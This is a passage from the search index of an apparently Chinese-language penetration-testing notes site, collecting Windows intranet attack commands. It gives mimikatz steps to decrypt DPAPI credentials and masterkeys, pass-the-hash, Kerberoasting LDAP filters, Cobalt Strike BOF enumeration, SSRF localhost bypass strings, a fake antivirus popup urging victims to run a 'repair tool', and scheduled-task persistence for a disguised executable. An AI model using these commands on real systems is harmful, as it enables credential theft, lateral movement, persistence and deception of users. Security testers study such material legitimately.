\u9ad8\u6743\u9650\u53ef\u4ee5\u7528mimikatz\u5b9e\u73b0\u3002 \u9ad8\u6743\u9650\u53ef\u4ee5\u7528TokenTest.exe\u5b9e\u73b0\u3002 \u4f4e\u6743\u9650\u53ef\u4ee5\u63d0\u6743\u5b9e\u73b0\u3002 tscon\u5207\u6362\u4f1a\u8bdd \u786e\u5b9a\u9700\u8981\u5207\u7684\u4f1a\u8bddID\uff0c quser \u3002 tscon 1 \u5207\u6362\u8fc7\u53bb\u3002","title":"RDP\u5207\u4f1a\u8bdd"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_10","text":"\u538b\u7f29 cabarc.exe -p -r N C:\\Users\\1.cab C:\\Users\\*.* \u89e3\u538b cabarc.exe -p -r X Npp.cab","title":"\u6253\u5305\u89e3\u5305"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_11","text":"C:\\Windows\\System32\\Winevt\\Logs\\Security.evtx","title":"\u5b89\u5168\u65e5\u5fd7\u8def\u5f84"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#windows-dpapi","text":"\u67e5\u770b\u662f\u5426\u5b58\u5728\u51ed\u636e cmdkey /list mimikatz vault::list \u51ed\u636e\u6587\u4ef6\u8def\u5f84\uff0c\u4e24\u4e2a\u76ee\u5f55\u90fd\u8981\u770b\u4e00\u4e0b dir /a:H %appdata%\\Microsoft\\Credentials dir /a:H %appdata%\\..\\local\\Microsoft\\Credentials \u4f7f\u7528mimikatz\u7684dpapi\u7684\u6a21\u5757\u89e3\u8bfb\u51ed\u636e dpapi::cred /in:%appdata%\\..\\local\\Microsoft\\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D \u81f3\u6b64\u53ef\u4ee5\u8bfb\u5230\u51ed\u636e\u76f8\u5bf9\u5e94\u7684masterkey\u7684Guid\uff0c\u4e0b\u4e00\u6b65\u4fbf\u662f\u62ff\u5230masterkey\uff0c\u518d\u7528masterkey\u53bb\u89e3\u5bc6\u51ed\u636e\u3002 masterkey\u5b58\u50a8\u4f4d\u7f6e dir /a %appdata%\\Microsoft\\Protect\\\u7528\u6237\u7684SID dir /a %appdata%\\Microsoft\\Protect\\\u7528\u6237\u7684SID cmd\u770b\u4e0d\u5230\u53ef\u4ee5\u7528ps\u770b Get-ChildItem %appdata%\\Microsoft\\Protect\\ Get-ChildItem %appdata%\\..\\Local\\Microsoft\\Protect Get-ChildItem -Hidden C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Protect\\ Get-ChildItem -Hidden C:\\Users\\USER\\AppData\\Local\\Microsoft\\Protect\\ Get-ChildItem -Hidden C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Protect\\{SID} Get-ChildItem -Hidden C:\\Users\\USER\\AppData\\Local\\Microsoft\\Protect\\{SID} \u89e3\u5bc6masterkey dpapi::masterkey /in:\"%appdata%\\Microsoft\\Protect\\S-1-5-21-2063765516-3997562686-97783222-1001\\f33071e3-1bdf-458c-89da-51927b10adcf\" /sid:S-1-5-21-2063765516-3997562686-97783222-1001 /password:123 /protected \u6ca1\u6709\u5bc6\u7801\u4e14\u5728\u57df\u5185 dpapi::masterkey /in:\"%appdata%\\Microsoft\\Protect\\S-1-5-21-2552734371-813931464-1050690807-1106\\3e90dd9e-f901-40a1-b691-84d7f647b8fe\" /rpc \u8fd8\u53ef\u4ee5\u76f4\u63a5\u8bfbmasterkey\uff0c\u4f46\u8fd9\u91cc\u8bfb\u7684masterkey\u4e0d\u4e00\u5b9a\u901a\u7528 sekurlsa::dpapi \u7528masterkey\u89e3\u5f97\u51ed\u636e dpapi::cred /in:%appdata%\\..\\local\\Microsoft\\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D /masterkey:4090030cd9d184908dde57301e3a27781e5262ce357fe6516c347ee0b5b4b5fccb987845e64e567ced8828a70d6a0684221500450faf9e8a9ea30d21414ad708 \u53ef\u4ee5\u4f7f\u7528DonpAPI\u6765\u81ea\u52a8\u5316\u6293\u5404\u79cd\u51ed\u636e DonPAPI.py domain/user:passw0rd@target","title":"Windows\u51ed\u636e-\u89e3DPAPI"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#cmd_1","text":"mimikatz sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:cmd.exe","title":"\u4ee5\u6307\u5b9a\u7528\u6237\u6765\u6253\u5f00\u4e00\u4e2acmd"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_12","text":"string64.exe aaa.bin | findstr /i abc","title":"\u641c\u7d22\u5b57\u7b26\u4e32"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_13","text":"systeminfo 1> c:\\windows\\temp\\1 2>&1","title":"\u6267\u884c\u547d\u4ee4\u4e14\u4e0d\u56de\u663e"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#ps","text":"powershell -ep bypass -noexit -file ok.ps1","title":"\u6267\u884cPS\u6587\u4ef6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#windows_1","text":"enum4linux -a -u \"\" -p \"\" 192.168.14.1 && enum4linux -a -u \"guest\" 192.168.14.1 cme smb 192.168.14.1 -u 'a' -p '' cme smb 192.168.14.1 -u '' -p '' \u679a\u4e3eLDAP ldapsearch -x -h 192.168.14.1 -s base","title":"\u679a\u4e3e\u533f\u540dwindows\u5171\u4eab"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#xcopy","text":"xcopy /s /i /e /h source target","title":"xcopy"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#powershell_2","text":"powershell -Command \"\"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('\u81ea\u884c\u8f66');\"","title":"Powershell\u5f39\u7a97"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#md5","text":"certutil -hashfile","title":"\u67e5\u8be2\u6587\u4ef6MD5"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#360","text":"reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\360Hvm /v Start 0x1\u5f00\uff0c 0x4\u5173 reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\360Safe\\safemon /v HvmUserAction 0x1\u5f00\uff0c0x0\u5173","title":"\u67e5\u8be2360\u6838\u6676"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#powershell_3","text":"%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt","title":"Powershell\u5386\u53f2\u8bb0\u5f55"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#md5_1","text":"certutil -hashfile yourfilename.ext MD5 certutil -hashfile yourfilename.ext SHA1 certutil -hashfile yourfilename.ext SHA256","title":"\u67e5\u770b\u6587\u4ef6MD5"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_14","text":"%ALLUSERSPROFILE% \uff1a \u5217\u51fa\u6240\u6709\u7528\u6237Profile\u6587\u4ef6\u4f4d\u7f6e\u3002 %COMSPEC% : CMD\u8def\u5f84\u3002 %APPDATA% : \u5217\u51fa\u5e94\u7528\u7a0b\u5e8f\u6570\u636e\u7684\u9ed8\u8ba4\u5b58\u653e\u4f4d\u7f6e\u3002 %CD% : \u5217\u51fa\u5f53\u524d\u76ee\u5f55\u3002 %CLIENTNAME% : \u5217\u51fa\u8054\u63a5\u5230\u7ec8\u7aef\u670d\u52a1\u4f1a\u8bdd\u65f6\u5ba2\u6237\u7aef\u7684NETBIOS\u540d\u3002 %CMDCMDLINE% : \u5217\u51fa\u542f\u52a8\u5f53\u524dcmd.exe\u6240\u4f7f\u7528\u7684\u547d\u4ee4\u884c\u3002 %CMDEXTVERSION% : \u547d\u4ee4\u51fa\u5f53\u524d\u547d\u4ee4\u5904\u7406\u7a0b\u5e8f\u6269\u5c55\u7248\u672c\u53f7\u3002 %CommonProgramFiles% : \u5217\u51fa\u4e86\u5e38\u7528\u6587\u4ef6\u7684\u6587\u4ef6\u5939\u8def\u5f84\u3002 %COMPUTERNAME% : \u5217\u51fa\u4e86\u8ba1\u7b97\u673a\u540d\u3002 %COMSPEC% : CMD\u8def\u5f84\u3002 %DATE% : \u5217\u51fa\u5f53\u524d\u65e5\u671f\u3002 %ERRORLEVEL% : \u5217\u51fa\u4e86\u6700\u8fd1\u4f7f\u7528\u7684\u547d\u4ee4\u7684\u9519\u8bef\u4ee3\u7801\u3002 %HOMEDRIVE% : \u5217\u51fa\u4e0e\u7528\u6237\u4e3b\u76ee\u5f55\u6240\u5728\u7684\u9a71\u52a8\u5668\u76d8\u7b26\u3002 %HOMEPATH% : \u5217\u51fa\u7528\u6237\u4e3b\u76ee\u5f55\u7684\u5b8c\u6574\u8def\u5f84\u3002 %HOMESHARE% : \u5217\u51fa\u7528\u6237\u5171\u4eab\u4e3b\u76ee\u5f55\u7684\u7f51\u7edc\u8def\u5f84\u3002 %LOGONSEVER% : \u5217\u51fa\u6709\u6548\u7684\u5f53\u524d\u767b\u5f55\u4f1a\u8bdd\u7684\u57df\u540d\u63a7\u5236\u5668\u540d\u3002 %NUMBER_OF_PROCESSORS% : \u5217\u51fa\u4e86\u8ba1\u7b97\u673a\u5b89\u88c5\u7684\u5904\u7406\u5668\u6570\u3002 %OS% : \u5217\u51fa\u64cd\u4f5c\u7cfb\u7edf\u7684\u540d\u5b57\u3002(Windows XP \u548c Windows 2000 \u5217\u4e3a Windows_NT.) %Path% : \u5217\u51fa\u4e86\u53ef\u6267\u884c\u6587\u4ef6\u7684\u641c\u7d22\u8def\u5f84\u3002 %PATHEXT% : \u5217\u51fa\u64cd\u4f5c\u7cfb\u7edf\u8ba4\u4e3a\u53ef\u88ab\u6267\u884c\u7684\u6587\u4ef6\u6269\u5c55\u540d\u3002 %PROCESSOR_ARCHITECTURE% : \u5217\u51fa\u4e86\u5904\u7406\u5668\u7684\u82af\u7247\u67b6\u6784\u3002 %PROCESSOR_IDENTFIER% : \u5217\u51fa\u4e86\u5904\u7406\u5668\u7684\u63cf\u8ff0\u3002 %PROCESSOR_LEVEL% : \u5217\u51fa\u4e86\u8ba1\u7b97\u673a\u7684\u5904\u7406\u5668\u7684\u578b\u53f7\u3002 %PROCESSOR_REVISION% : \u5217\u51fa\u4e86\u5904\u7406\u5668\u7684\u4fee\u8ba2\u53f7\u3002 %ProgramFiles% : \u5217\u51fa\u4e86Program Files\u6587\u4ef6\u5939\u7684\u8def\u5f84\u3002 %PROMPT% : \u5217\u51fa\u4e86\u5f53\u524d\u547d\u4ee4\u89e3\u91ca\u5668\u7684\u547d\u4ee4\u63d0\u793a\u8bbe\u7f6e\u3002 %RANDOM% : \u5217\u51fa\u754c\u4e8e0 \u548c 32767\u4e4b\u95f4\u7684\u968f\u673a\u5341\u8fdb\u5236\u6570\u3002 %SESSIONNAME% : \u5217\u51fa\u8fde\u63a5\u5230\u7ec8\u7aef\u670d\u52a1\u4f1a\u8bdd\u65f6\u7684\u8fde\u63a5\u548c\u4f1a\u8bdd\u540d\u3002 %SYSTEMDRIVE% : \u5217\u51fa\u4e86Windows\u542f\u52a8\u76ee\u5f55\u6240\u5728\u9a71\u52a8\u5668\u3002 %SYSTEMROOT% : \u5217\u51fa\u4e86Windows\u542f\u52a8\u76ee\u5f55\u7684\u4f4d\u7f6e\u3002 %TEMP% and %TMP% : \u5217\u51fa\u4e86\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u53ef\u7528\u5e94\u7528\u7a0b\u5e8f\u7684\u9ed8\u8ba4\u4e34\u65f6\u76ee\u5f55\u3002 %TIME% : \u5217\u51fa\u5f53\u524d\u65f6\u95f4\u3002 %USERDOMAIN% : \u5217\u51fa\u4e86\u5305\u542b\u7528\u6237\u5e10\u53f7\u7684\u57df\u7684\u540d\u5b57\u3002 %USERNAME% : \u5217\u51fa\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u7684\u540d\u5b57\u3002 %USERPROFILE% : \u5217\u51fa\u5f53\u524d\u7528\u6237Profile\u6587\u4ef6\u4f4d\u7f6e\u3002 %WINDIR% : \u5217\u51fa\u64cd\u4f5c\u7cfb\u7edf\u76ee\u5f55\u7684\u4f4d\u7f6e\u3002 \u53d8\u91cf \u7c7b\u578b \u63cf\u8ff0 %ALLUSERSPROFILE% \u672c\u5730 \u8fd4\u56de\u201c\u6240\u6709\u7528\u6237\u201d\u914d\u7f6e\u6587\u4ef6\u7684\u4f4d\u7f6e\u3002 %APPDATA% \u672c\u5730 \u8fd4\u56de\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5e94\u7528\u7a0b\u5e8f\u5b58\u50a8\u6570\u636e\u7684\u4f4d\u7f6e\u3002 %CD% \u672c\u5730 \u8fd4\u56de\u5f53\u524d\u76ee\u5f55\u5b57\u7b26\u4e32\u3002 %CMDCMDLINE% \u672c\u5730 \u8fd4\u56de\u7528\u6765\u542f\u52a8\u5f53\u524d\u7684 Cmd.exe \u7684\u51c6\u786e\u547d\u4ee4\u884c\u3002 %CMDEXTVERSION% \u7cfb\u7edf \u8fd4\u56de\u5f53\u524d\u7684\u201c\u547d\u4ee4\u5904\u7406\u7a0b\u5e8f\u6269\u5c55\u201d\u7684\u7248\u672c\u53f7\u3002 %COMPUTERNAME% \u7cfb\u7edf \u8fd4\u56de\u8ba1\u7b97\u673a\u7684\u540d\u79f0\u3002 %COMSPEC% \u7cfb\u7edf \u8fd4\u56de\u547d\u4ee4\u884c\u89e3\u91ca\u5668\u53ef\u6267\u884c\u7a0b\u5e8f\u7684\u51c6\u786e\u8def\u5f84\u3002 %DATE% \u7cfb\u7edf \u8fd4\u56de\u5f53\u524d\u65e5\u671f\u3002\u4f7f\u7528\u4e0e date /t \u547d\u4ee4\u76f8\u540c\u7684\u683c\u5f0f\u3002\u7531 Cmd.exe \u751f\u6210\u3002\u6709\u5173 date \u547d\u4ee4\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Date\u3002 %ERRORLEVEL% \u7cfb\u7edf \u8fd4\u56de\u4e0a\u4e00\u6761\u547d\u4ee4\u7684\u9519\u8bef\u4ee3\u7801\u3002\u901a\u5e38\u7528\u975e\u96f6\u503c\u8868\u793a\u9519\u8bef\u3002 %HOMEDRIVE% \u7cfb\u7edf \u8fd4\u56de\u8fde\u63a5\u5230\u7528\u6237\u4e3b\u76ee\u5f55\u7684\u672c\u5730\u5de5\u4f5c\u7ad9\u9a71\u52a8\u5668\u53f7\u3002\u57fa\u4e8e\u4e3b\u76ee\u5f55\u503c\u800c\u8bbe\u7f6e\u3002\u7528\u6237\u4e3b\u76ee\u5f55\u662f\u5728\u201c\u672c\u5730\u7528\u6237\u548c\u7ec4\u201d\u4e2d\u6307\u5b9a\u7684\u3002 %HOMEPATH% \u7cfb\u7edf \u8fd4\u56de\u7528\u6237\u4e3b\u76ee\u5f55\u7684\u5b8c\u6574\u8def\u5f84\u3002\u57fa\u4e8e\u4e3b\u76ee\u5f55\u503c\u800c\u8bbe\u7f6e\u3002\u7528\u6237\u4e3b\u76ee\u5f55\u662f\u5728\u201c\u672c\u5730\u7528\u6237\u548c\u7ec4\u201d\u4e2d\u6307\u5b9a\u7684\u3002 %HOMESHARE% \u7cfb\u7edf \u8fd4\u56de\u7528\u6237\u7684\u5171\u4eab\u4e3b\u76ee\u5f55\u7684\u7f51\u7edc\u8def\u5f84\u3002\u57fa\u4e8e\u4e3b\u76ee\u5f55\u503c\u800c\u8bbe\u7f6e\u3002\u7528\u6237\u4e3b\u76ee\u5f55\u662f\u5728\u201c\u672c\u5730\u7528\u6237\u548c\u7ec4\u201d\u4e2d\u6307\u5b9a\u7684\u3002 %LOGONSERVER% \u672c\u5730 \u8fd4\u56de\u9a8c\u8bc1\u5f53\u524d\u767b\u5f55\u4f1a\u8bdd\u7684\u57df\u63a7\u5236\u5668\u7684\u540d\u79f0\u3002 %NUMBER_OF_PROCESSORS% \u7cfb\u7edf \u6307\u5b9a\u5b89\u88c5\u5728\u8ba1\u7b97\u673a\u4e0a\u7684\u5904\u7406\u5668\u7684\u6570\u76ee\u3002 %OS% \u7cfb\u7edf \u8fd4\u56de\u64cd\u4f5c\u7cfb\u7edf\u540d\u79f0\u3002Windows 2000 \u663e\u793a\u5176\u64cd\u4f5c\u7cfb\u7edf\u4e3a Windows_NT\u3002 %PATH% \u7cfb\u7edf \u6307\u5b9a\u53ef\u6267\u884c\u6587\u4ef6\u7684\u641c\u7d22\u8def\u5f84\u3002 %PATHEXT% \u7cfb\u7edf \u8fd4\u56de\u64cd\u4f5c\u7cfb\u7edf\u8ba4\u4e3a\u53ef\u6267\u884c\u7684\u6587\u4ef6\u6269\u5c55\u540d\u7684\u5217\u8868\u3002 %PROCESSOR_ARCHITECTURE% \u7cfb\u7edf \u8fd4\u56de\u5904\u7406\u5668\u7684\u82af\u7247\u4f53\u7cfb\u7ed3\u6784\u3002\u503c\uff1ax86 \u6216 IA64\uff08\u57fa\u4e8e Itanium\uff09\u3002 %PROCESSOR_IDENTFIER% \u7cfb\u7edf \u8fd4\u56de\u5904\u7406\u5668\u8bf4\u660e\u3002 %PROCESSOR_LEVEL% \u7cfb\u7edf \u8fd4\u56de\u8ba1\u7b97\u673a\u4e0a\u5b89\u88c5\u7684\u5904\u7406\u5668\u7684\u578b\u53f7\u3002 %PROCESSOR_REVISION% \u7cfb\u7edf \u8fd4\u56de\u5904\u7406\u5668\u7684\u7248\u672c\u53f7\u3002 %PROMPT% \u672c\u5730 \u8fd4\u56de\u5f53\u524d\u89e3\u91ca\u7a0b\u5e8f\u7684\u547d\u4ee4\u63d0\u793a\u7b26\u8bbe\u7f6e\u3002\u7531 Cmd.exe \u751f\u6210\u3002 %RANDOM% \u7cfb\u7edf \u8fd4\u56de 0 \u5230 32767 \u4e4b\u95f4\u7684\u4efb\u610f\u5341\u8fdb\u5236\u6570\u5b57\u3002\u7531 Cmd.exe \u751f\u6210\u3002 %SYSTEMDRIVE% \u7cfb\u7edf \u8fd4\u56de\u5305\u542b Windows server operating system \u6839\u76ee\u5f55\uff08\u5373\u7cfb\u7edf\u6839\u76ee\u5f55\uff09\u7684\u9a71\u52a8\u5668\u3002 %SYSTEMROOT% \u7cfb\u7edf \u8fd4\u56de Windows server operating system \u6839\u76ee\u5f55\u7684\u4f4d\u7f6e\u3002 %TEMP% \u548c %TMP% \u7cfb\u7edf\u548c\u7528\u6237 \u8fd4\u56de\u5bf9\u5f53\u524d\u767b\u5f55\u7528\u6237\u53ef\u7528\u7684\u5e94\u7528\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u9ed8\u8ba4\u4e34\u65f6\u76ee\u5f55\u3002\u6709\u4e9b\u5e94\u7528\u7a0b\u5e8f\u9700\u8981 TEMP\uff0c\u800c\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u5219\u9700\u8981 TMP\u3002 %TIME% \u7cfb\u7edf \u8fd4\u56de\u5f53\u524d\u65f6\u95f4\u3002\u4f7f\u7528\u4e0e time /t \u547d\u4ee4\u76f8\u540c\u7684\u683c\u5f0f\u3002\u7531 Cmd.exe \u751f\u6210\u3002\u6709\u5173 time \u547d\u4ee4\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Time\u3002 %USERDOMAIN% \u672c\u5730 \u8fd4\u56de\u5305\u542b\u7528\u6237\u5e10\u6237\u7684\u57df\u7684\u540d\u79f0\u3002 %USERNAME% \u672c\u5730 \u8fd4\u56de\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u7684\u540d\u79f0\u3002 %USERPROFILE% \u672c\u5730 \u8fd4\u56de\u5f53\u524d\u7528\u6237\u7684\u914d\u7f6e\u6587\u4ef6\u7684\u4f4d\u7f6e\u3002 %WINDIR% \u7cfb\u7edf \u8fd4\u56de\u64cd\u4f5c\u7cfb\u7edf\u76ee\u5f55\u7684\u4f4d\u7f6e\u3002 %allusersprofile%--------------------\u6240\u6709\u7528\u6237\u7684profile\u8def\u5f84 %Userprofile%-----------------------\u5f53\u524d\u7528\u6237\u7684\u914d\u7f6e\u6587\u4ef6\u76ee\u5f55 %Appdata%--------------------------\u5f53\u524d\u7528\u6237\u7684\u5e94\u7528\u7a0b\u5e8f\u8def\u5f84 %commonprogramfiles%-------------\u5e94\u7528\u7a0b\u5e8f\u516c\u7528\u7684\u6587\u4ef6\u8def\u5f84 %homedrive%------------------------\u5f53\u524d\u7528\u6237\u7684\u4e3b\u76d8 %Homepath%------------------------\u5f53\u524d\u7528\u6237\u7684\u4e3b\u76ee\u5f55 %programfiles%----------------------\u5e94\u7528\u7a0b\u5e8f\u7684\u9ed8\u8ba4\u5b89\u88c5\u76ee\u5f55 %systemdrive%----------------------\u7cfb\u7edf\u6240\u5728\u7684\u76d8\u7b26 %systemroot%-----------------------\u7cfb\u7edf\u6240\u5728\u7684\u76ee\u5f55 %windir%----------------------------\u540c\u4e0a\uff0c\u603b\u662f\u8ddfsystemroot\u4e00\u6837 %tmp%------------------------------\u5f53\u524d\u7528\u6237\u7684\u4e34\u65f6\u76ee\u5f55 %temp%-----------------------------\u540c\u4e0a\u4e34\u65f6\u76ee\u5f55","title":"\u5404\u4e2a\u73af\u5883\u53d8\u91cf"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_15","text":"C:\\Windows\\System32\\Winevt\\Logs\\Security.evtx","title":"\u5b89\u5168\u65e5\u5fd7\u8def\u5f84"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_16","text":"shell mshta vbscript:Execute(\"msgbox \"\"\u522b\u5206\u6790\u4e86\u5927\u54e5\"\":close\") msg %username% /time:1000 XXX\u96c6\u56e2\u5b89\u5168\u5e73\u53f0\u63d0\u9192\u60a8\uff1a\u60a8\u7684\u6587\u6863\u7591\u4f3c\u611f\u67d3\u5b8f\u75c5\u6bd2\uff0c\u8bf7\u7acb\u5373\u8fd0\u884c\u684c\u9762\u7684\u4fee\u590d\u5de5\u5177\uff01","title":"\u5f39\u7a97"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_17","text":"psr.exe /start /gui 0 /output C:\\Users\\Public\\out.zip psr.exe /stop","title":"\u6301\u7eed\u622a\u5c4f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#localhost","text":"127.0.0.1:80 127.0.0.1:443 127.0.0.1:22 127.1:80 0 0.0.0.0:80 localhost:80 [::]:80/ [::]:25/ SMTP [::]:3128/ Squid [0000::1]:80/ [0:0:0:0:0:ffff:127.0.0.1]/thefile \u2460\u2461\u2466.\u24ea.\u24ea.\u24ea 127.127.127.127 127.0.1.3 127.0.0.0 2130706433/ 017700000001 3232235521/ 3232235777/ 0x7f000001/ 0xc0a80014/ {domain} @127 .0.0.1 127.0.0.1#{domain} {domain}.127.0.0.1 127.0.0.1/{domain} 127.0.0.1/?d={domain} {domain} @127 .0.0.1 127.0.0.1#{domain} {domain}.127.0.0.1 127.0.0.1/{domain} 127.0.0.1/?d={domain} {domain} @localhost localhost#{domain} {domain}.localhost localhost/{domain} localhost/?d={domain} 127.0.0.1%00{domain} 127.0.0.1?{domain} 127.0.0.1///{domain} 127.0.0.1%00{domain} 127.0.0.1?{domain} 127.0.0.1///{domain}st:+11211aaa st:00011211aaaa 1.1.1.1 &@2.2.2.2# @3 .3.3.3/ 127.1.1.1:80\\@ @127 .2.2.2:80/. 127.1.1.1:80#\\ @127 .2.2.2:80/ Enclosed Alphanumeric Bypasses : http:// 169.254.169.254/%0A http:// %E2%93%AA%E2%93%A7%E2%93%90%E2%91%A8%EF%BD%A1%E2%93%AA%E2%93%A7%E2%93%95%E2%93%94%EF%BD%A1%E2%93%AA%E2%93%A7%E2%93%90%E2%91%A8%EF%BD%A1%E2%93%AA%E2%93%A7%E2%93%95%E2%93%94:80/","title":"Localhost\u53d8\u79cd"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/","text":"Situational-Awareness SA.cna dir \u67e5\u770b\u5f53\u524d\u76ee\u5f55 env \u67e5\u770b\u73af\u5883\u53d8\u91cf ldapsearch ldapsearch\u5de5\u5177 beacon> ldapsearch [-] ldapsearch <query> [comma_separated_attributes] [result_count] [DC hostname or IP] [Distingished Name to use] \"\" works as a default for attributes (get all) DC hostname / IP (use Primary DC) and distingished name (use Base domain Level) 0 works as default for result_count (get all) Useful queries: - Kerberoastable: (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) - AS-REP Roastable: (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) - Passwords stored with reversible encryption: (&(objectClass=user)(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=128)) If this fails with an error about paging not being supported you can try tou se nonpagedldapsearch instead (its unregistered but has the same arguments) ipconfig \u770b\u7f51\u7edc arp \u770barp\u8868 resources \u78c1\u76d8\u7a7a\u95f4 uptime \u5f00\u673a\u65f6\u95f4 tasklist nslookup beacon> nslookup [-] Synopsis: nslookup <lookup value> <lookup server> <TYPE> Perform a DNS Query: <lookup value> is the ip or hostname you want to query <lookup server> is the server you want to query (use 0 or exclude for system default) <TYPE> record type to query listdns \u67e5\u770bdns\u7f13\u5b58 listmods \u67e5\u770b\u8fdb\u7a0b\u52a0\u8f7d\u7684\u6a21\u5757 locale \u67e5\u770b\u65e5\u671f\u65f6\u95f4\u56fd\u5bb6 adcs_enum\u3001adcs_enum_com\u3001adcs_enum_com2 \u679a\u4e3eadcs\u670d\u52a1\u5668\u7684CA\u6a21\u677f vssenum \u679a\u4e3e\u5feb\u7167 get_password_policy \u5bc6\u7801\u7b56\u7565 probe \u7aef\u53e3\u626b\u63cf notepad \u4ece\u6253\u5f00\u7684\u8bb0\u4e8b\u672c\u4e2d\u83b7\u53d6\u6587\u672c netuse_add \u5efa\u7acb\u4e00\u4e2aIPC\u8fde\u63a5 Example: Bind IPC$ of a remote computer using current user context netuse_add \\\\somedc.somedomain.local\\IPC$ \"\" \"\" Map a Share without creating a specific device mapping using current user context netuse_add \\\\fileshare.somedomain.local\\adminstuff \"\" \"\" Map a Share without creating a specific device mapping, using a diferent set of credentials netuse_add \\\\fileshare.somedomain.local\\adminstuff someuser SomeUsersPassword /DEVICE:F Map a persistent share in the current user context netuse_add \\\\fileshare.somedomain.local\\userdrive \"\" \"\" /PERSIST netuse_list \u67e5\u770bIPC\u8fde\u63a5 netuse_delete \u5220\u9664IPC\u8fde\u63a5 netuser \u67e5\u770b\u7528\u6237\u4fe1\u606f windowlist \u67e5\u770b\u53ef\u89c1\u7a97\u53e3 netstat \u67e5\u770b\u7f51\u7edc\u8fde\u63a5 routeprint \u67e5\u770b\u8def\u7531 whoami userenum \u679a\u4e3e\u7528\u6237 domainenum \u679a\u4e3e\u57df driversigs \u67e5\u770bedr enum_filter_driver \u67e5\u770b\u6740\u6bd2 netshares\u3001netsharesAdmin \u67e5\u770b\u7f51\u7edc\u5171\u4eab netGroupList \u67e5\u770b\u57df\u7ec4 netGroupListMembers \u67e5\u770b\u57df\u7ec4\u6240\u5c5e netGroupListMembers: <Group Name> <opt: domainname> netLocalGroupList \u67e5\u770b\u7ec4 netLocalGroupListMembers schtasksenum \u679a\u4e3e\u8ba1\u5212\u4efb\u52a1 schtasksquery \u67e5\u8be2\u6307\u5b9a\u8ba1\u5212\u4efb\u52a1 cacls \u67e5\u770b\u7a0b\u5e8f\u7684\u6743\u9650 sc_query \u67e5\u770b\u670d\u52a1 sc_qc \u67e5\u8be2\u670d\u52a1\u914d\u7f6e sc_qdescription \u67e5\u8be2\u670d\u52a1\u63cf\u8ff0 sc_qfailure sc_qtriggerinfo sc_enum reg_query reg_query_recursive netview wmi_query netsession adv_audit_policies listpipes findLoadedModule \u8ba1\u5212\u4efb\u52a1\u51fd\u6570schtaskscreate\u7684\u4f7f\u7528 \u6ce8\u610f\u4fee\u6539xml\u6587\u4ef6-PT50M.xml \u5927\u90e8\u5206\u4e0d\u7528\u52a8\uff0c\u9700\u8981\u4fee\u6539\u7684\u5730\u65b9\u6709 PT50M \u6bcf\u969450\u5206\u949f\u542f\u52a8\u6267\u884c\u4e00\u6b21 S-1-5-21-1083132562-1065254770-2819855764-1000 \u4ee5\u54ea\u4e2a\u7528\u6237\u6267\u884c \u9700\u8981\u67e5\u770b\u5f53\u524d\u7528\u6237\u7684UID c:\\windows\\system32\\SyspartRepair.exe \u6267\u884c\u6587\u4ef6\u7684\u8def\u5f84 